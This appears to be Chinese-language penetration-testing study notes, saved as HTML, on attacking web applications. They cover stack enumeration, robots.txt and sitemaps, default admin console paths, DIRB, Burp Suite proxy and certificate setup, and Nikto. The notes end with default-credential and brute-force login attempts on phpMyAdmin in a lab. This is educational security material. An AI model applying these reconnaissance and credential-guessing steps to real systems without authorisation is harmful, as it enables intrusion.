@@ -1,0 +1,737 @@
+<html>
+<head>
+<META http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+<meta content="text/css" http-equiv="Content-Style-Type">
+<title>攻击web应用（part1）</title>
+</head>
+<body>
+<h1 align="center" class="root">
+<a name="45ktlij4q9mdpo3bdccui39l3f">攻击web应用（part1）</a>
+</h1>
+<div align="center" class="globalOverview">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/images/%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89.jpg"></div>
+<h2 class="topic">
+<a name="5eubkd8t8md0jtl75qjgr7o9e8">OWASP Top 10</a>
+</h2>
+<h3 class="topic">
+<a href="https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project" name="251019lckgbvrmiuujgt4g0344">&nbsp;https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project</a>
+</h3>
+<h2 class="topic">
+<a name="0lmtg12lt5bm8ophbvuqm6c4ek">Web应用程序枚举</a>
+</h2>
+<h3 class="topic">
+<a name="7dqmqhpdpeoqhr0kv03s06buf3">&nbsp;web应用程序框架组成</a>
+</h3>
+<h3 class="topic">
+<a name="6pripq9kmghmpck9fln8qikrhs">&nbsp;&nbsp;编程语言和框架，Web服务器软件、数据库软件、服务器操作系统</a>
+</h3>
+<h3 class="topic">
+<a name="3n6h16t3j9i44r1nrkup0srj5q">&nbsp;&nbsp;可以使用多种技术直接从浏览器中收集此信息。 大多数现代浏览器都包含可协助枚举过程的开发人员工具</a>
+</h3>
+<h3 class="topic">
+<a name="76a0bb0405le1959sa063744d5">&nbsp;确定web应用程序的技术框架</a>
+</h3>
+<h3 class="topic">
+<a name="1g2vng51irkgn2hmjko8ngcnei">&nbsp;&nbsp;检查url</a>
+</h3>
+<h3 class="topic">
+<a name="4cskm0aft7dmgfg07dom0bqkcp">&nbsp;&nbsp;&nbsp;文件扩展名有时是URL的一部分，可以揭示应用程序编写的编程语言。其中某些文件（如.php）很简单，但其他扩展名则更晦涩难懂，并且会根据所使用的框架而有所不同。 例如，基于Java的Web应用程序可能使用.jsp，.do或.html。&#13;
+   但是，由于许多语言和框架现在都支持路由的概念，因此网页上的文件扩展名变得不那么普遍了，这使开发人员可以将URI映射到代码段。 利用路由的应用程序使用逻辑来确定将哪些内容返回给用户，并使URI扩展基本无关。</a>
+</h3>
+<h3 class="topic">
+<a name="762ajh4pb424k7us71c622bs6b">&nbsp;&nbsp;检查页面内容</a>
+</h3>
+<h3 class="topic">
+<a name="78kcajqs8dhit2gi2nfhpd59db">&nbsp;&nbsp;&nbsp;大多数上下文线索都可以在网页源中找到。  Firefox Debugger工具（可在Web Developer菜单中找到，也可以通过按ctrl shift k来找到。Debugger工具可以显示JavaScript框架，隐藏的输入字段，注释，HTML，JavaScript中的客户端控件等）。</a>
+</h3>
+<h3 class="topic">
+<a name="7g3t9enauq6hgqiulki3krt2nd">&nbsp;&nbsp;&nbsp;&nbsp;可以看到，运行在www.megacorpone.com上的应用程序使用jQuery版本1.11.0，这是一个常见的JavaScript库。</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/0pafbhojdohcgup3q46b0p384b.png"></p>
+<h3 class="topic">
+<a name="5itcvvcu9g6n4brqbghpblllha">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;点击{}之后会使html代码页面更加可读</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/02t7l8frj0pgsmpdapgcl9p757.png"></p>
+<h3 class="topic">
+<a name="3qskocciu8lpehb3s5lnpc7ioh">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;html代码更加可读</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/52k9k26b3eupceted06mv12n4b.png"></p>
+<h3 class="topic">
+<a name="6rsp66doalr0kf7sdnl1tpog2c">&nbsp;&nbsp;&nbsp;检查html页面元素</a>
+</h3>
+<h3 class="topic">
+<a name="5bdt67uc3daft2f347v82nkfd2">&nbsp;&nbsp;&nbsp;&nbsp;使用Inspector工具深入查看特定页面的内容。检查电子邮件输入元素，方法是右键单击页面上的电子邮件地址字段，然后选择&ldquo;检查元素&rdquo;或使用快捷键Q。</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/6ihbp00gv29tvtb953sksdtuh4.png"></p>
+<h3 class="topic">
+<a name="5jnt5lumh0tlo6mq0me5766ih5">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这将打开&ldquo;检查器&rdquo;工具，并突出显示我们右键单击的元素的HTML。</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/1ufh851s86tuhhm134kcnedpch.png"></p>
+<h3 class="topic">
+<a name="6ubgdjt1jlegggha5ub7tr2eb3">&nbsp;&nbsp;&nbsp;&nbsp;该工具对于在HTML源代码中快速查找隐藏的表单字段特别有用。</a>
+</h3>
+<h3 class="topic">
+<a name="24b9n9v26h7gk53r4f8j7pims4">&nbsp;查看响应头</a>
+</h3>
+<h3 class="topic">
+<a name="310gh43hk40fdb6tcr9qojils4">&nbsp;&nbsp;即使用代理（例如burpsuite）或Firefox Web Developer菜单启动的Network工具从而查看http的请求和响应</a>
+</h3>
+<h3 class="topic">
+<a name="2f1si05lkmasf0g3bijn1db70e">&nbsp;&nbsp;network工具</a>
+</h3>
+<h3 class="topic">
+<a name="66jhh0ocm9cjfsg62gkga86k7m">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/2l5v41bv08a99imd94clp8bovp.png"></p>
+<h3 class="topic">
+<a name="7dut6pfdtcjghvvqls6g4fbq96">&nbsp;&nbsp;&nbsp;&nbsp;单击请求从而获得更多详细信息</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/3tcn28bjt9cou4kv16me1chi4v.png"></p>
+<h3 class="topic">
+<a name="133lh43eegbelnntkbm4tch800">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	&ldquo;Server&rdquo;标题通常至少会显示Web服务器软件的名称。 在许多默认配置中，它还会显示版本号。&#13;
+	以&ldquo; X-&rdquo;开头的标头是非标准的HTTP标头，其名称或值通常会揭示有关应用程序使用的技术堆栈的其他信息。 非标准标头的一些示例包括X-Powered-By，x-amz-cf-id和X-Aspnet-Version。 对这些名称的进一步研究可能会发现更多信息，例如&ldquo; x-amz-cf-id&rdquo;标头，它指示应用程序使用了Amazon CloudFront。</a>
+</h3>
+<h3 class="topic">
+<a name="4k03lp188tvm6purdmvl0jror7">&nbsp;检查站点地图</a>
+</h3>
+<h3 class="topic">
+<a name="2p6i8727nnstmn0214lq1sdrae">&nbsp;&nbsp;Web应用程序可以包括站点地图文件，以帮助搜索引擎机器人对其站点进行爬网和索引。 这些文件还包含不能被搜索引擎爬取的页面列表。 这些通常是敏感页面或管理控制台-正是我们感兴趣的页面类型。&#13;
+   两种最常见的站点地图文件名是robots.txt和sitemap.xml。 例如，我们可以使用curl从www.google.com检索robots.txt文件：</a>
+</h3>
+<h3 class="topic">
+<a name="00ctgbqfjk6k5usokgp6i84v20">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/1gor76eu8ukonrmkt9g1prh14t.png"></p>
+<h3 class="topic">
+<a name="4j609vd78nolevpddpkd97i679">&nbsp;&nbsp;&nbsp;&nbsp;使用crul下载指定站点的sitemap，该文件显示了允许搜索引擎爬取和不允许搜索引擎爬取的网页</a>
+</h3>
+<h3 class="topic">
+<a name="4ce5v82njn5q9bl5qi2s9nc6ru">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/1ko4qukp4phef0sue02ildjsok.png"></p>
+<h3 class="topic">
+<a name="0kt9m6a244jb5008sg6mrcsetk">&nbsp;&nbsp;&nbsp;&nbsp;curl是一个利用URL规则在命令行下工作的文件传输工具，可以说是一款很强大的http命令行工具。它支持文件的上传和下载，是综合传输工具，但按传统，习惯称url为下载工具。</a>
+</h3>
+<h3 class="topic">
+<a name="2o2bhg06e4dkb5sc433u7a4n1m">&nbsp;查找管理控制台</a>
+</h3>
+<h3 class="topic">
+<a name="5m7a3p5nmfs79lbh7n85rt5bt8">&nbsp;&nbsp;Web服务器通常附带远程管理Web应用程序或控制台，可通过特定的URL访问这些Web应用程序或控制台，并且通常在特定的TCP端口上进行侦听。这些控制台可以限制为本地访问，也可以托管在自定义TCP端口上，但我们经常发现它们在默认配置下对外公开。&#13;
+应该检查应用程序服务器软件文档中标识的默认控制台位置&#13;
+示例：&#13;
+/ manager / html是Tomcat+MySQL的默认后台路径&#13;
+/ phpmyadmin是phpMyAdmin+MySQL的默认后台路径</a>
+</h3>
+<h2 class="topic">
+<a name="7979ograr3cnlkak1hi7a9mn38">Web应用程序评估工具</a>
+</h2>
+<h3 class="topic">
+<a name="4j1uher5lloh020206hl02d558">&nbsp;DIRB</a>
+</h3>
+<h3 class="topic">
+<a name="29vrl7nt3i98lqqo7nibosbr95">&nbsp;&nbsp;DIRB243是一个Web内容扫描程序，它使用单词列表通过向服务器发出请求来查找目录和页面。&#13;
+  默认情况下，DIRB将识别服务器上有趣的目录，但也可以对其进行自定义以搜索特定目录，使用自定义词典，在每个请求上设置自定义cookie或标头等等。</a>
+</h3>
+<h3 class="topic">
+<a name="3hsqlbdj6lfhj3v4l1ct7mscc8">&nbsp;&nbsp;&nbsp;参数：用于扫描的URL，用于非递归扫描的-r和用于每个请求增加10毫秒延迟的-z 10： </a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/0ud3eef5ghdc34hl2qbpifnkcr.png"></p>
+<h3 class="topic">
+<a name="7h30v05vd3rcohiq8l0umhllbt">&nbsp;&nbsp;&nbsp;&nbsp;DIRB发出了4,612个请求，并报告了URL，状态代码和九种不同资源的大小。 默认情况下，该工具将递归到新发现的目录中，但是在这种情况下，我们的非递归（-r）扫描仅报告目录而不会下降到目录中。 显然，我们可以从针对大型目标的非递归扫描开始，然后递归搜索感兴趣的目录，或者根据我们的需求从完整的递归扫描开始。</a>
+</h3>
+<h3 class="topic">
+<a name="1h6aqjp4ub9qstt0plams9dr62">&nbsp;&nbsp;DirBuster是类似于DIRB的Java应用程序，它提供多线程和基于GUI的界面</a>
+</h3>
+<h3 class="topic">
+<a name="3dff8sqrgcnl2rjdsp18o6rghv">&nbsp;Burp Suite</a>
+</h3>
+<h3 class="topic">
+<a name="7kodb5oqghq74cbdnpglj7rvet">&nbsp;&nbsp;免费的Community Edition主要包含用于手动测试的工具，而商业版本则包含其他功能，包括强大的Web应用程序漏洞扫描程序。 </a>
+</h3>
+<h3 class="topic">
+<a name="2h608j710sucqhunl666c0fj5g">&nbsp;&nbsp;启动burpsuite</a>
+</h3>
+<h3 class="topic">
+<a name="0m7ok66d597if2afdj0qdqm242">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/676s0dphahbek7eprmmdrnrmbv.png"></p>
+<h3 class="topic">
+<a name="4vsraof28g8k1d5ehu520ertjb">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/3e2o6cuplhql7t1rde3q1r8j6r.png"></p>
+<h3 class="topic">
+<a name="76pmtees2mqgbre696hh7i09ke">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;选择临时项目，next</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/1e9uq14jagjteolajo7s3umvff.png"></p>
+<h3 class="topic">
+<a name="4gqaq4cegclholicoif52be01f">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用默认设置，开始使用</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/0m1ma9000505o4ejp1i8nsjrv9.png"></p>
+<h3 class="topic">
+<a name="3dbdmj8g3gl8dfffo2beqo2hir">&nbsp;&nbsp;使用burpsuite</a>
+</h3>
+<h3 class="topic">
+<a name="0if70mucsvc4apsv6l4vs72l76">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/3d0tv2qq7agpk4hac1lrlt8kg7.png"></p>
+<h3 class="topic">
+<a name="2oejqifdir16b5vrnn07joquqg">&nbsp;&nbsp;&nbsp;&nbsp;在代理选项卡中禁用拦截，从而保证浏览器的浏览不会被断下</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/0c9v5q8k00l3kid1nh0p7b2nkg.png"></p>
+<h3 class="topic">
+<a name="3091egvlhodsfc6nobmrbqfap7">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;查看侦听代理请求的本地端口，此时为8080端口</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/6g0cpq1spmk483u42pdn7cn9gd.png"></p>
+<h3 class="topic">
+<a name="4cv8qk1nt6pv097jtck5ed3sc3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;设置在burpsuite打开后默认关闭拦截</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/080s5qbjq33r0cpmoubuo7d3ov.png"></p>
+<h3 class="topic">
+<a name="2762cb581lovskbvaa19t1uujf">&nbsp;&nbsp;为火狐安装代理插件：FoxyProxy Basic</a>
+</h3>
+<h3 class="topic">
+<a name="2qg8o1qlt1meii6td50cc8jc74">&nbsp;&nbsp;&nbsp;添加代理</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/2e2m3vsj2f8alua3tb9bjao9sd.png"></p>
+<h3 class="topic">
+<a name="51qnt4n1fct5b1hm2q6m5qvpij">&nbsp;&nbsp;&nbsp;&nbsp;搜索指定的插件</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/7hoaeq7pkd27mo12sjtunphffl.png"></p>
+<h3 class="topic">
+<a name="4h0hlj3r8g60dqg0o6qusro7nc">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;安装base版本的插件，该版本更容易配置</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/1tsf4fbgk4h36v7pes06e9rvu1.png"></p>
+<h3 class="topic">
+<a name="6ttuhhvcndrd33f18ffh0og8me">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;安装插件</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/1ib5a4h5ikr8qch06nn3ecmpar.png"></p>
+<h3 class="topic">
+<a name="5mml9tjc33bi0dpa3fi74us529">&nbsp;&nbsp;&nbsp;安装完成后自动显示欢迎页面，并在右上角出现插件图标</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/7h65194rhq3rfoi21uj73avemo.png"></p>
+<h3 class="topic">
+<a name="62r0cv3b5n9oeecokl4qu2fl71">&nbsp;&nbsp;&nbsp;&nbsp;使用该插件前需要设置配置文件</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/7sb1dcb0sc0jfvkoafsa4et043.png"></p>
+<h3 class="topic">
+<a name="353lbulbb89t1pvb6l7gi1trss">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;选择add，从而添加代理</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/1v7lheanahcmd66387klkq409n.png"></p>
+<h3 class="topic">
+<a name="1qtr7ml9t7na3ckji4tfvg1is1">&nbsp;&nbsp;&nbsp;为burp设置代理，&ldquo;代理类型&rdquo;设置为&ldquo; HTTP&rdquo;，为&ldquo;标题&rdquo;输入&ldquo; Burp&rdquo;，为IP地址输入&ldquo; 127.0.0.1&rdquo;。 代理侦听器端口号8080.</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/51eojpeu1ssc9ldh8mpbvjmjha.png"></p>
+<h3 class="topic">
+<a name="04nj8ufhk820kg8oactbmot54r">&nbsp;&nbsp;&nbsp;&nbsp;启用burp suite的代理</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/216dds7f565vtp6k2nj2jesugs.png"></p>
+<h3 class="topic">
+<a name="6jsjmord0uilho2kv73g9kb44e">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;成功启用代理</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/1hsgpsvickrl01j6nm6jiml10o.png"></p>
+<h3 class="topic">
+<a name="798q8emct55bds7mcipqtd7071">&nbsp;&nbsp;使用burp查看http访问流</a>
+</h3>
+<h3 class="topic">
+<a name="5v7sqe1k8bhs0jgadenvk0bh31">&nbsp;&nbsp;&nbsp;浏览器访问指定网址，burp的httphistory中出现请求</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/55helnnesvdm08c20hc42qc861.png"></p>
+<h3 class="topic">
+<a name="4c2rrki9qdlmnnbpj1ohuf262i">&nbsp;&nbsp;&nbsp;&nbsp;如何关闭浏览记录中detectportal.firefox.com等强制门户网页（此类网页常用作网管页面，常用于身份验证）</a>
+</h3>
+<h3 class="topic">
+<a name="3u8p59lg4sh7ku9een8s4cgmn7">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为什么detectportal.firefox.com会继续显示在代理历史记录中？ 强制门户网站246是一个网页，在尝试浏览Internet时用作一种网关页面。 当接受用户协议或通过浏览器向Wi-Fi网络进行身份验证时，通常会显示该信息。 要忽略这一点，只需在地址栏中输入about：config。  Firefox将发出警告，但我们可以单击&ldquo;我接受风险！&rdquo;继续进行操作。 最后，搜索&ldquo; network.captive-portal-service.enabled&rdquo;并双击以将其值更改为&ldquo; false&rdquo;。 这将防止这些消息出现在代理历史记录中。</a>
+</h3>
+<h3 class="topic">
+<a name="2vuqnrlhfso9h0bqccf3614siu">&nbsp;&nbsp;使用burp查看https访问流</a>
+</h3>
+<h3 class="topic">
+<a name="2pscd217gqh74q9br1uddrfa5m">&nbsp;&nbsp;&nbsp;如果我们在通过Burp代理流量（例如https://www.google.com）时浏览HTTPS网站，则会收到&ldquo;无效证书&rdquo;警告：</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/6dqlchfkcrt21lo0r8jqh3uolm.png"></p>
+<h3 class="topic">
+<a name="5lc2g82g9uo1kknlb5msnnjvjm">&nbsp;&nbsp;&nbsp;&nbsp;Burp可以通过生成自己的SSL / TLS证书轻松地解密HTTPS流量，我们可以通过颁发新证书并将其导入Firefox来防止它们出现。在确认对话框中单击&ldquo;是&rdquo;，然后重新启动Burp Suite。</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/3mt6fum65jdkp170n0kfpk5qsa.png"></p>
+<h3 class="topic">
+<a name="0a9ctrpkrmt3gvriomo8505vb2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;要将新的CA证书导入Firefox，我们将首先浏览到http：// burp以找到该证书的链接：</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/33iobb37urvvrrvp4fqmmbnl4j.png"></p>
+<h3 class="topic">
+<a name="6khk61iri1dq3a47glbildas2f">&nbsp;&nbsp;&nbsp;单击&ldquo; CA证书&rdquo;（或连接到http：// burp / cert），然后将cacert.der文件保存到我们的本地计算机上。</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/3qhs0fdfci412k7qfidci0oajg.png"></p>
+<h3 class="topic">
+<a name="0eq8s5kdbpmk1huh5bu30mv511">&nbsp;&nbsp;&nbsp;&nbsp;将下载的文件拖放到Firefox中，选择&ldquo;信任此CA以标识网站&rdquo;，然后单击&ldquo;确定&rdquo;。</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/7uosab6lg7oidr89a7les9leed.png"></p>
+<h3 class="topic">
+<a name="21vphq9b02b86v95rrludbk2np">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;再次使用HTTPS浏览至一个网站，例如https://www.google.com，该网站应加载而不会发出警告，并在BurpSuite的HTTP历史记录标签中生成HTTPS流量。</a>
+</h3>
+<h3 class="topic">
+<a name="5jdqsia95q4u2fck9250asht3l">&nbsp;&nbsp;repeater工具</a>
+</h3>
+<h3 class="topic">
+<a name="1egnocapu0bnmdsdqm201e94uk">&nbsp;&nbsp;&nbsp;将指定数据包发送到repeater中</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/258mi8e061e107mse2i7tqre61.png"></p>
+<h3 class="topic">
+<a name="1u899sul4fn9aihj3o5ht75ic5">&nbsp;&nbsp;&nbsp;&nbsp;repeater中可以有多个选项卡，以对应多个数据包，点击send可以将数据包发送到指定网站</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/3f9f1i2hbascg5b6iv6s85gs8r.png"></p>
+<h3 class="topic">
+<a name="0455h26lc6bnfb9nc4hot1apup">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;窗口右侧显示原始服务器响应，其中包括响应标题和未呈现的响应内容。</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/7r5dobdk35m39vntni8iq7l160.png"></p>
+<h3 class="topic">
+<a name="2tj74aqv1179qvqh3tbvoab570">&nbsp;Nikto</a>
+</h3>
+<h3 class="topic">
+<a name="1e0djfbsfla8ehtpjbruhlqtk3">&nbsp;&nbsp;Nikto248是一种高度可配置的开源Web服务器扫描程序，可测试成千上万的危险文件和程序，易受攻击的服务器版本以及各种服务器配置问题。 它执行良好，但不是为隐身而设计的，因为它将发送许多请求并将有关自身的信息嵌入到User-Agent249标头中。</a>
+</h3>
+<h3 class="topic">
+<a name="7a5u3ctc5dvm3ebgi4fqj72u12">&nbsp;&nbsp;   Nikto可以扫描多个服务器和端口，并且可以扫描找到的尽可能多的页面。 我们有两个选项来控制扫描持续时间。 </a>
+</h3>
+<h3 class="topic">
+<a name="53jp42ub84f81732hdsmrevqn2">&nbsp;&nbsp;&nbsp; 最简单的选项是设置-maxtime选项，该选项将在指定的时间限制后停止扫描。 这不会以任何方式优化扫描。  Nikto只会停止扫描。</a>
+</h3>
+<h3 class="topic">
+<a name="6370c8u90h5fts4tjslhiuld3t">&nbsp;&nbsp;&nbsp;我们的第二个选项是使用-T选项调整扫描，使用此功能可以控制我们要运行的测试类型。 有时候我们不想运行Nikto内置的所有测试，例如验证是否存在特定类别的漏洞</a>
+</h3>
+<h3 class="topic">
+<a name="3gpftumu225f268l5168j1p3ee">&nbsp;&nbsp;Nikto对于捕获低下的成果，报告非标准服务器头以及捕获服务器配置错误特别有用。</a>
+</h3>
+<h3 class="topic">
+<a name="0l2r66el7171g0kblm42ubr5ab">&nbsp;&nbsp;&nbsp;（-host = http：//www.megacorpone.com），为了便于演示，我们将使用-maxtime = 30s将扫描持续时间限制为30秒： </a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/7a6oaovge58iu0p21khjdghasd.png"></p>
+<h3 class="topic">
+<a name="7k4ds5oofe8pv4nmmpkqrat2vt">&nbsp;&nbsp;&nbsp;&nbsp;工具确定服务器上运行的Apache版本已过期且已过期。</a>
+</h3>
+<h2 class="topic">
+<a name="5d977ismkokdq0p6auh5pbf835">利用基于Web的漏洞</a>
+</h2>
+<h3 class="topic">
+<a name="16r6gpshvi8srjri7s8p83bci5">&nbsp;利用管理控制台</a>
+</h3>
+<h3 class="topic">
+<a name="6bfm9gst4tnesskrk6li0tsoub">&nbsp;&nbsp; 找到管理控制台后，最简单的&ldquo;漏洞利用&rdquo;就是直接登录。 我们可能会尝试使用默认的用户名/密码对，使用枚举信息来猜测有效的凭据，或者尝试暴力破解。</a>
+</h3>
+<h3 class="topic">
+<a name="3d6b70ds081hrs9vssouqfjani">&nbsp;&nbsp;暴力破解可能导致账户锁定或蓝队察觉，所以需小心</a>
+</h3>
+<h3 class="topic">
+<a name="6l6quugdv8mmbpb191am8c7amp">&nbsp;&nbsp;针对Windows 10目标上安装的配置不当的管理控制台的攻击为例</a>
+</h3>
+<h3 class="topic">
+<a name="7h9uh532s4c46adauu6dhff29i">&nbsp;&nbsp;&nbsp;win10中运行MAMPP，并启动apache和MySQL</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/1doj66gi7olrqcqtchcvmafiu4.png"></p>
+<h3 class="topic">
+<a name="4b37g9n1eosrb5dcgklglpujqf">&nbsp;&nbsp;&nbsp;&nbsp;针对Windows 10计算机从Kali运行dirb。&#13;
+（dirb是一个网站目录扫描工具)&#13;
+(https://zhuanlan.zhihu.com/p/26549845）&#13;
+（-r参数表示不进行递归搜索）&#13;
+输出中包括对MySQL数据库管理工具phpmyadmin的突出显示</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/15hhkmldhg8pf655dt2g0rifk4.png"></p>
+<h3 class="topic">
+<a name="3rba3i889t9u6npiuo1jr34dm3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在浏览器中输入相应的URL会生成一个phpMyAdmin登录页面：</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/7ka1h26tfefv8a1tdlr05bhuki.png"></p>
+<h3 class="topic">
+<a name="7pk1da3ajeuig3pir1ro8pjl2m">&nbsp;&nbsp;&nbsp;phpMYAdmin的默认登录凭据包括带有空白密码的&ldquo; root&rdquo;。 让我们尝试针对Windows 10目标</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/7kpkim6cn8gm3is5iu0cdjicu6.png"></p>
+<h3 class="topic">
+<a name="3v5kea2jgrcdirtpvubmk9osnl">&nbsp;&nbsp;&nbsp;&nbsp;如果尝试使用这些凭据，则会收到错误消息&ldquo;配置禁止不使用密码登录&rdquo;。 这是因为在phpMyAdmin配置文件（C：\ xampp \ phpMyAdmin \ config.inc.php）中，&ldquo; AllowNoPassword&rdquo;设置为False。 在此配置下，我们需要包括一个密码才能登录，因此我们可以合理地假设密码不是空白。 如果要获得访问权限，我们将不得不尝试其他方法</a>
+</h3>
+<h3 class="topic">
+<a name="2svm1gtu5spmf1o20rbotdl0ko">&nbsp;&nbsp;Burp Suite Intruder</a>
+</h3>
+<h3 class="topic">
